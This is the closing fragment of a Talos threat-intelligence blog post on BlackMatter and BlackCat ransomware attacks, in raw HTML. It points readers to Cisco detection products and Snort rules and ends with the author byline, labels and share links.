Additional protections with context to your specific environment and threat data are available from the <a href="https://www.google.com/url?q=https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html&amp;sa=D&amp;source=editors&amp;ust=1647513308827032&amp;usg=AOvVaw37fEDTYOyyFBAOKayJLVIc">Firewall Management Center</a>.
Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on <a href="https://www.google.com/url?q=https://www.snort.org/products&amp;sa=D&amp;source=editors&amp;ust=1647513308827333&amp;usg=AOvVaw3hFtX7HctUEwgY4dek0ZoO">Snort.org</a>.
<h4 id="h.yty1f9c9rjge">Orbital Queries</h4>
Cisco Secure Endpoint users can use <a href="https://www.google.com/url?q=https://orbital.amp.cisco.com/help/&amp;sa=D&amp;source=editors&amp;ust=1647513308827691&amp;usg=AOvVaw0JNyDPDhGXPNaGUoPlJV0u">Orbital Advanced Search</a> to run complex OSqueries to see if their endpoints are infected with this specific threat.
Posted by
<a class="g-profile" href="https://www.blogger.com/profile/01628152585699526914" rel="author" title="author profile">
Tiago Pereira
</a>
at
<a class="timestamp-link" href="http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html" rel="bookmark" title="permanent link">7:58 AM</a>
<a href="https://www.blogger.com/post-edit.g?blogID=1029833275466591797&amp;postID=6970460627068478444&amp;from=pencil" title="Edit Post">
<img alt="" class="icon-action" height="18" src="https://img2.blogblog.com/img/icon18_edit_allbkg.gif" width="18"/>
</a>
Labels:
<a href="http://blog.talosintelligence.com/search/label/Malware" rel="tag">Malware</a>,
<a href="http://blog.talosintelligence.com/search/label/ransomware" rel="tag">ransomware</a>
Share This Post
<a class="facebook" href="https://www.facebook.com/sharer.php?u=http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html&amp;text=From%20BlackMatter%20to%20BlackCat:%20Analyzing%20two%20attacks%20from%20one%20affiliate" rel="nofollow" target="_blank" title="Share This On Facebook">
<img alt="Facebook share" border="0" src="https://www.talosintelligence.com/assets/icon_fb-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<a class="twitter" href="https://twitter.com/share?url=http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html&amp;text=From%20BlackMatter%20to%20BlackCat:%20Analyzing%20two%20attacks%20from%20one%20affiliate" rel="nofollow" target="_blank" title="Tweet This">
<img alt="Twitter share" border="0" src="https://www.talosintelligence.com/assets/icon_tw-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<a class="linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html&amp;text=From%20BlackMatter%20to%20BlackCat:%20Analyzing%20two%20attacks%20from%20one%20affiliate" rel="nofollow" target="_blank" title="Share This On Linkedin">
<img alt="Linkedin share" border="0" src="https://www.talosintelligence.com/assets/icon_li-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<a class="reddit" href="https://www.reddit.com/submit?url=http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html&amp;title=From%20BlackMatter%20to%20BlackCat:%20Analyzing%20two%20attacks%20from%20one%20affiliate" rel="nofollow" target="_blank" title="Reddit This">
<img alt="Reddit share" border="0" src="https://www.talosintelligence.com/assets/icon_re-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<a href="mailto:?body=http://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html&amp;subject=From%20BlackMatter%20to%20BlackCat:%20Analyzing%20two%20attacks%20from%20one%20affiliate">
<img alt="Email This" border="0" src="https://www.talosintelligence.com/assets/icon_em-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
</div>